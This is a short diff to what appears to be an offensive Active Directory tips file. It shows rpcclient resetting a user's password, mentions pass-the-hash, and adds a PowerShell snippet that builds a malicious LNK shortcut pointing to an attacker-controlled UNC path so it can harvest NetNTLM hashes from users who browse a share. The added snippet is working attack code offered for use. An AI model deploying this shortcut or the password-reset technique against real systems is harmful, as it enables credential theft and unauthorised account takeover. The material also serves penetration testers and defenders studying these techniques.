@@ -37,3 +37,16 @@ Using bash script:
 <br/>`rpcclient $> setuserinfo2 supportAccount 23 SuperNewPassword22`
 
 --> Note : If package passing-the-hash is installed on attacker machine, you can even do this with just a NTLM hash. (Flag : --pw-nt-hash)
+
+### Tip 4
+##### Drop malicious LNK file on share to retrieve NetNTLM hashes
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\Malicious.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@file.txt"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "LNK file"
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
